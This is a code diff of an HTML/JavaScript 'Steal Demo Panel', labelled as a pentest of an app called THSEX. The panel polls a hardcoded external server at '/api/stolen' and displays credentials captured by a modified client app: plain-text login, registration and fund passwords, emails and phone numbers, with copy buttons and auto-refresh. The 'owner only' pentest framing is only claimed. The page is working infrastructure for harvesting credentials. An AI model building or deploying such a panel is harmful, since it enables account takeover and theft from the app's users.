@@ -2,56 +2,378 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Attacker Panel — Steal Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="theme-color" content="#0b0b10" />
+  <title>Steal Demo Panel</title>
   <style>
-    * { box-sizing: border-box; }
-    body { font-family: system-ui, sans-serif; background: #0f0f14; color: #eee; margin: 0; padding: 20px; }
-    h1 { color: #ff4455; }
-    .warn { background: #3a1515; border: 1px solid #ff4455; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
-    input { width: 100%; max-width: 480px; padding: 10px; margin: 6px 0 12px; border-radius: 6px; border: 1px solid #444; background: #1a1a22; color: #fff; }
-    button { background: #ff4455; color: #fff; border: 0; padding: 10px 16px; border-radius: 6px; cursor: pointer; margin-right: 8px; }
-    button.secondary { background: #333; }
-    table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
-    th, td { border: 1px solid #333; padding: 8px; text-align: left; vertical-align: top; }
-    th { background: #1a1a22; }
-    .pwd { color: #ff8888; font-weight: bold; font-family: monospace; }
-    .hash { color: #888; font-size: 12px; }
+    :root {
+      --bg: #0b0b10;
+      --surface: #14141c;
+      --surface2: #1c1c28;
+      --border: #2a2a3a;
+      --text: #eaeaf0;
+      --muted: #8888a0;
+      --accent: #ff3b5c;
+      --accent2: #ff6b85;
+      --green: #22c55e;
+      --blue: #3b82f6;
+      --orange: #f59e0b;
+      --purple: #a855f7;
+      --radius: 14px;
+      --shadow: 0 8px 32px rgba(0,0,0,.45);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* header */
+    .header {
+      background: linear-gradient(135deg, #1a0a10 0%, #14141c 50%, #0b0b10 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 20px 16px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(12px);
+    }
+    .header-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-icon {
+      width: 40px; height: 40px;
+      background: linear-gradient(135deg, var(--accent), #c41e3a);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px;
+    }
+    .logo h1 { font-size: 18px; font-weight: 700; color: #fff; }
+    .logo p { font-size: 11px; color: var(--muted); }
+    .badge-live {
+      background: rgba(34,197,94,.15);
+      color: var(--green);
+      border: 1px solid rgba(34,197,94,.3);
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 20px;
+      white-space: nowrap;
+    }
+
+    /* stats */
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+    .stat {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 8px;
+      text-align: center;
+    }
+    .stat-num { font-size: 22px; font-weight: 800; color: #fff; }
+    .stat-lbl { font-size: 10px; color: var(--muted); margin-top: 2px; text-transform: uppercase; letter-spacing: .5px; }
+
+    /* controls */
+    .controls {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px;
+      margin: 0 16px 16px;
+      box-shadow: var(--shadow);
+    }
+    .controls label { font-size: 12px; color: var(--muted); display: block; margin-bottom: 6px; }
+    .input-row { display: flex; gap: 8px; margin-bottom: 12px; }
+    .input-row input {
+      flex: 1;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      padding: 10px 12px;
+      font-size: 13px;
+      outline: none;
+      min-width: 0;
+    }
+    .input-row input:focus { border-color: var(--accent); }
+    .btn-row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+    button {
+      border: 0;
+      border-radius: 8px;
+      padding: 10px 16px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity .15s;
+    }
+    button:active { opacity: .75; }
+    button:disabled { opacity: .35; cursor: not-allowed; }
+    .btn-primary { background: var(--accent); color: #fff; }
+    .btn-ghost { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
+    .btn-danger { background: #3a1018; color: #ff6b85; border: 1px solid #5a2030; }
+    .chk-label { font-size: 12px; color: var(--muted); display: flex; align-items: center; gap: 6px; cursor: pointer; }
+    .chk-label input { width: 16px; height: 16px; accent-color: var(--accent); }
+
+    /* filter tabs */
+    .filters {
+      display: flex;
+      gap: 6px;
+      overflow-x: auto;
+      padding: 0 16px 12px;
+      scrollbar-width: none;
+    }
+    .filters::-webkit-scrollbar { display: none; }
+    .filter-btn {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      border-radius: 20px;
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 600;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: all .15s;
+    }
+    .filter-btn.active {
+      background: var(--accent);
+      border-color: var(--accent);
+      color: #fff;
+    }
+
+    /* status */
+  #status {
+      text-align: center;
+      font-size: 13px;
+      color: var(--muted);
+      padding: 4px 16px 12px;
+    }
+    #status.error { color: var(--accent2); }
+    #status.ok { color: var(--green); }
+
+    /* cards list */
+    .list { padding: 0 16px 32px; display: flex; flex-direction: column; gap: 12px; }
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+      box-shadow: var(--shadow);
+      animation: fadeIn .3s ease;
+    }
+    @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:none; } }
+    .card-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 14px;
+      border-bottom: 1px solid var(--border);
+      gap: 8px;
+    }
+    .action-badge {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 10px;
+      border-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: .4px;
+    }
+    .action-login { background: rgba(255,59,92,.15); color: var(--accent2); border: 1px solid rgba(255,59,92,.3); }
+    .action-register { background: rgba(59,130,246,.15); color: var(--blue); border: 1px solid rgba(59,130,246,.3); }
+    .action-change_login_password { background: rgba(245,158,11,.15); color: var(--orange); border: 1px solid rgba(245,158,11,.3); }
+    .action-change_fund_password { background: rgba(168,85,247,.15); color: var(--purple); border: 1px solid rgba(168,85,247,.3); }
+    .action-unknown { background: var(--surface2); color: var(--muted); border: 1px solid var(--border); }
+    .card-time { font-size: 11px; color: var(--muted); white-space: nowrap; }
+
+    .card-body { padding: 14px; }
+    .field { margin-bottom: 10px; }
+    .field:last-child { margin-bottom: 0; }
+    .field-label { font-size: 10px; text-transform: uppercase; letter-spacing: .6px; color: var(--muted); margin-bottom: 3px; }
+    .field-value { font-size: 14px; color: var(--text); word-break: break-all; }
+    .field-value.mono { font-family: "SF Mono", "Fira Code", monospace; font-size: 13px; }
+
+    .pwd-block {
+      background: rgba(255,59,92,.08);
+      border: 1px solid rgba(255,59,92,.2);
+      border-radius: 8px;
+      padding: 10px 12px;
+    }
+    .pwd-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      padding: 4px 0;
+    }
+    .pwd-key { font-size: 11px; color: var(--muted); }
+    .pwd-val { font-family: monospace; font-size: 14px; font-weight: 700; color: var(--accent2); }
+    .copy-btn {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      border-radius: 6px;
+      padding: 3px 8px;
+      font-size: 11px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .payload-toggle {
+      width: 100%;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      border-radius: 8px;
+      padding: 8px;
+      font-size: 12px;
+      cursor: pointer;
+      margin-top: 10px;
+      text-align: left;
+    }
+    .payload-box {
+      display: none;
+      background: #0a0a12;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px;
+      margin-top: 8px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #a0a0b8;
+      word-break: break-all;
+      white-space: pre-wrap;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .payload-box.open { display: block; }
+
+    .empty {
+      text-align: center;
+      padding: 48px 24px;
+      color: var(--muted);
+    }
+    .empty-icon { font-size: 48px; margin-bottom: 12px; }
+    .empty h3 { font-size: 16px; color: var(--text); margin-bottom: 6px; }
+
+    /* desktop table fallback */
+    .table-wrap { display: none; overflow-x: auto; padding: 0 16px 32px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th, td { border: 1px solid var(--border); padding: 10px; text-align: left; vertical-align: top; }
+    th { background: var(--surface2); color: var(--muted); font-size: 11px; text-transform: uppercase; }
+    td { background: var(--surface); }
+    .pwd { color: var(--accent2); font-family: monospace; font-weight: 700; }
+
+    @media (min-width: 900px) {
+      .header { padding: 24px 32px 20px; }
+      .controls { margin: 0 32px 20px; }
+      .filters { padding: 0 32px 16px; }
+      .list { display: none; }
+      .table-wrap { display: block; }
+      .stats { max-width: 600px; }
+    }
+    @media (max-width: 480px) {
+      .stats { grid-template-columns: repeat(2, 1fr); }
+      .stat-num { font-size: 18px; }
+    }
   </style>
 </head>
 <body>
-  <h1>Attacker Panel (Demo)</h1>
-  <div class="warn">
-    <strong>Proof:</strong> Login passwords from modified THSEX client arrive here in
-    <strong>PLAIN TEXT</strong>. Client does not hash before send. Real server hashes on backend only.
+
+  <div class="header">
+    <div class="header-top">
+      <div class="logo">
+        <div class="logo-icon">🎯</div>
+        <div>
+          <h1>Steal Demo Panel</h1>
+          <p>THSEX Pentest — Owner Only</p>
+        </div>
+      </div>
+      <span class="badge-live" id="liveBadge">● LIVE</span>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="stat-num" id="statTotal">0</div><div class="stat-lbl">Total</div></div>
+      <div class="stat"><div class="stat-num" id="statLogin">0</div><div class="stat-lbl">Login</div></div>
+      <div class="stat"><div class="stat-num" id="statRegister">0</div><div class="stat-lbl">Register</div></div>
+      <div class="stat"><div class="stat-num" id="statPwd">0</div><div class="stat-lbl">Pwd Change</div></div>
+    </div>
   </div>
 
-  <label>Your deployed steal server URL (no trailing slash)</label>
-  <input id="apiBase" placeholder="https://web-production-682ba.up.railway.app" value="https://web-production-682ba.up.railway.app" />
+  <div class="controls">
+    <label>Server URL</label>
+    <div class="input-row">
+      <input id="apiBase" placeholder="https://your-server.railway.app" />
+    </div>
+    <div class="btn-row">
+      <button class="btn-primary" onclick="refresh()">↻ Refresh</button>
+      <button class="btn-ghost" onclick="toggleAuto()"><span id="autoLabel">Auto: OFF</span></button>
+      <button class="btn-danger" id="clearBtn" onclick="clearAll()" disabled>🗑 Clear</button>
+      <label class="chk-label">
+        <input type="checkbox" id="enableClear" onchange="toggleClear()" />
+        Enable clear
+      </label>
+    </div>
+  </div>
 
-  <button onclick="refresh()">Refresh stolen list</button>
-  <button class="secondary" onclick="clearAll()">Clear (danger)</button>
-  <label style="display:inline; margin-left:8px; font-size:13px;">
-    <input type="checkbox" id="enableClear" style="width:auto; margin:0 4px 0 0;" onchange="toggleClear()" />
-    Enable clear
-  </label>
+  <div class="filters" id="filters">
+    <button class="filter-btn active" data-filter="all" onclick="setFilter('all',this)">All</button>
+    <button class="filter-btn" data-filter="login" onclick="setFilter('login',this)">Login</button>
+    <button class="filter-btn" data-filter="register" onclick="setFilter('register',this)">Register</button>
+    <button class="filter-btn" data-filter="change_login_password" onclick="setFilter('change_login_password',this)">Login Pwd</button>
+    <button class="filter-btn" data-filter="change_fund_password" onclick="setFilter('change_fund_password',this)">Fund Pwd</button>
+  </div>
 
   <p id="status"></p>
-  <table>
-    <thead>
-      <tr>
-        <th>Time (UTC)</th>
-        <th>Mobile</th>
-        <th>Email</th>
-        <th>Password (plain)</th>
-        <th>Full payload</th>
-      </tr>
-    </thead>
-    <tbody id="rows"></tbody>
-  </table>
+
+  <!-- mobile cards -->
+  <div class="list" id="cardList">
+    <div class="empty" id="emptyState">
+      <div class="empty-icon">📭</div>
+      <h3>No data yet</h3>
+      <p>Login / Register / Change password on patched app — data will appear here.</p>
+    </div>
+  </div>
+
+  <!-- desktop table -->
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Time (UTC)</th>
+          <th>Action</th>
+          <th>Mobile</th>
+          <th>Email</th>
+          <th>Passwords (plain)</th>
+          <th>Payload</th>
+        </tr>
+      </thead>
+      <tbody id="tableRows"></tbody>
+    </table>
+  </div>
 
   <script>
     const DEFAULT_BASE = 'https://web-production-682ba.up.railway.app';
+    let allData = [];
+    let currentFilter = 'all';
+    let autoTimer = null;
+
     const saved = localStorage.getItem('stealApiBase') || DEFAULT_BASE;
     document.getElementById('apiBase').value = saved;
 
@@ -61,49 +383,183 @@
       return v;
     }
 
+    function esc(s) {
+      return String(s ?? '-').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function fmtTime(iso) {
+      if (!iso) return '-';
+      const d = new Date(iso);
+      return d.toLocaleString('en-GB', { day:'2-digit', month:'short', hour:'2-digit', minute:'2-digit', second:'2-digit' });
+    }
+
+    function actionLabel(a) {
+      const map = {
+        login: 'Login',
+        register: 'Register',
+        change_login_password: 'Change Login Pwd',
+        change_fund_password: 'Change Fund Pwd',
+      };
+      return map[a] || a || 'Unknown';
+    }
+
+    function getPasswords(row) {
+      const p = row.payload || {};
+      const pwds = row.passwords_plain || {};
+      if (Object.keys(pwds).length) return pwds;
+      const single = row.password_plain || p.password || p.newPassword;
+      return single ? { password: single } : {};
+    }
+
+    function copyText(text, btn) {
+      navigator.clipboard.writeText(text).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = '✓';
+        setTimeout(() => btn.textContent = orig, 1200);
+      });
+    }
+
+    function buildPwdHtml(pwds) {
+      return Object.entries(pwds).map(([k,v]) => `
+        <div class="pwd-row">
+          <div><div class="pwd-key">${esc(k)}</div><div class="pwd-val">${esc(v)}</div></div>
+          <button class="copy-btn" onclick="copyText('${String(v).replace(/'/g,"\\'")}',this)">Copy</button>
+        </div>`).join('');
+    }
+
+    function buildPwdText(pwds) {
+      return Object.entries(pwds).map(([k,v]) => k+': '+v).join('<br>') || '-';
+    }
+
+    function updateStats(data) {
+      const counts = { login:0, register:0, pwd:0 };
+      data.forEach(r => {
+        const a = r.action || (r.payload||{}).action || '';
+        if (a === 'login') counts.login++;
+        else if (a === 'register') counts.register++;
+        else if (a.includes('password')) counts.pwd++;
+      });
+      document.getElementById('statTotal').textContent = data.length;
+      document.getElementById('statLogin').textContent = counts.login;
+      document.getElementById('statRegister').textContent = counts.register;
+      document.getElementById('statPwd').textContent = counts.pwd;
+    }
+
+    function renderCards(rows) {
+      const list = document.getElementById('cardList');
+      const filtered = currentFilter === 'all' ? rows : rows.filter(r => {
+        const a = r.action || (r.payload||{}).action || '';
+        return a === currentFilter;
+      });
+
+      if (!filtered.length) {
+        list.innerHTML = `<div class="empty"><div class="empty-icon">📭</div><h3>No records</h3><p>${currentFilter === 'all' ? 'Waiting for captured data...' : 'No '+actionLabel(currentFilter)+' records yet.'}</p></div>`;
+        return;
+      }
+
+      list.innerHTML = filtered.map((row, idx) => {
+        const p = row.payload || {};
+        const action = row.action || p.action || 'unknown';
+        const pwds = getPasswords(row);
+        const mobile = row.mobile || p.mobile || p.phone || '-';
+        const email = row.email || p.email || '-';
+        const device = p.loginDevice || p.device || '';
+        const id = 'payload-' + idx;
+
+        return `<div class="card">
+          <div class="card-head">
+            <span class="action-badge action-${esc(action)}">${esc(actionLabel(action))}</span>
+            <span class="card-time">${esc(fmtTime(row.received_at))}</span>
+          </div>
+          <div class="card-body">
+            ${email !== '-' ? `<div class="field"><div class="field-label">Email</div><div class="field-value">${esc(email)}</div></div>` : ''}
+            ${mobile !== '-' ? `<div class="field"><div class="field-label">Mobile</div><div class="field-value">${esc(mobile)}</div></div>` : ''}
+            ${device ? `<div class="field"><div class="field-label">Device</div><div class="field-value">${esc(device)}</div></div>` : ''}
+            ${Object.keys(pwds).length ? `<div class="field"><div class="field-label">⚠ Passwords (Plain Text)</div><div class="pwd-block">${buildPwdHtml(pwds)}</div></div>` : ''}
+            <button class="payload-toggle" onclick="togglePayload('${id}',this)">▶ Show full payload</button>
+            <div class="payload-box" id="${id}">${esc(JSON.stringify(p, null, 2))}</div>
+          </div>
+        </div>`;
+      }).join('');
+    }
+
+    function renderTable(rows) {
+      const tbody = document.getElementById('tableRows');
+      const filtered = currentFilter === 'all' ? rows : rows.filter(r => (r.action||(r.payload||{}).action) === currentFilter);
+      tbody.innerHTML = filtered.map(row => {
+        const p = row.payload || {};
+        const pwds = getPasswords(row);
+        return `<tr>
+          <td>${esc(fmtTime(row.received_at))}</td>
+          <td><span class="action-badge action-${esc(row.action||p.action||'unknown')}">${esc(actionLabel(row.action||p.action))}</span></td>
+          <td>${esc(row.mobile||p.mobile||p.phone||'-')}</td>
+          <td>${esc(row.email||p.email||'-')}</td>
+          <td class="pwd">${buildPwdText(pwds)}</td>
+          <td><code style="font-size:11px">${esc(JSON.stringify(p))}</code></td>
+        </tr>`;
+      }).join('');
+    }
+
+    function togglePayload(id, btn) {
+      const el = document.getElementById(id);
+      const open = el.classList.toggle('open');
+      btn.textContent = (open ? '▼' : '▶') + ' ' + (open ? 'Hide' : 'Show') + ' full payload';
+    }
+
+    function setFilter(f, btn) {
+      currentFilter = f;
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      renderCards(allData);
+      renderTable(allData);
+    }
+
     async function refresh() {
       const b = base();
-      if (!b) { document.getElementById('status').textContent = 'Enter server URL first'; return; }
-      document.getElementById('status').textContent = 'Loading...';
+      const status = document.getElementById('status');
+      if (!b) { status.textContent = 'Enter server URL first'; status.className = 'error'; return; }
+      status.textContent = 'Loading...'; status.className = '';
       try {
         const r = await fetch(b + '/api/stolen');
         const j = await r.json();
-        const tbody = document.getElementById('rows');
-        tbody.innerHTML = '';
-        (j.data || []).slice().reverse().forEach(row => {
-          const p = row.payload || {};
-          const tr = document.createElement('tr');
-          tr.innerHTML = `
-            <td>${row.received_at || ''}</td>
-            <td>${row.mobile || p.mobile || p.phone || '-'}</td>
-            <td>${row.email || p.email || '-'}</td>
-            <td class="pwd">${row.password_plain || p.password || '-'}</td>
-            <td><code>${JSON.stringify(p)}</code></td>`;
-          tbody.appendChild(tr);
-        });
-        document.getElementById('status').textContent = 'Total stolen: ' + (j.count || 0);
+        allData = (j.data || []).slice().reverse();
+        updateStats(j.data || []);
+        renderCards(allData);
+        renderTable(allData);
+        status.textContent = '✓ ' + (j.count||0) + ' records — updated ' + new Date().toLocaleTimeString();
+        status.className = 'ok';
+        document.getElementById('liveBadge').textContent = '● LIVE';
       } catch (e) {
-        document.getElementById('status').textContent = 'Error: ' + e.message;
+        status.textContent = '✗ Error: ' + e.message;
+        status.className = 'error';
+        document.getElementById('liveBadge').textContent = '● OFFLINE';
       }
     }
 
     function toggleClear() {
-      const on = document.getElementById('enableClear').checked;
-      document.querySelector('button.secondary').disabled = !on;
+      document.getElementById('clearBtn').disabled = !document.getElementById('enableClear').checked;
     }
 
     async function clearAll() {
       const b = base();
-      if (!b) return;
-      if (!document.getElementById('enableClear').checked) {
-        document.getElementById('status').textContent = 'Clear disabled — tick "Enable clear" first';
-        return;
-      }
-      if (!confirm('DELETE all captured credentials permanently? This cannot be undone.')) return;
+      if (!b || !document.getElementById('enableClear').checked) return;
+      if (!confirm('DELETE all captured data permanently?')) return;
       await fetch(b + '/api/stolen/clear', { method: 'POST' });
       document.getElementById('enableClear').checked = false;
       toggleClear();
       refresh();
+    }
+
+    function toggleAuto() {
+      if (autoTimer) {
+        clearInterval(autoTimer);
+        autoTimer = null;
+        document.getElementById('autoLabel').textContent = 'Auto: OFF';
+      } else {
+        autoTimer = setInterval(refresh, 10000);
+        document.getElementById('autoLabel').textContent = 'Auto: ON (10s)';
+        refresh();
+      }
     }
 
     toggleClear();
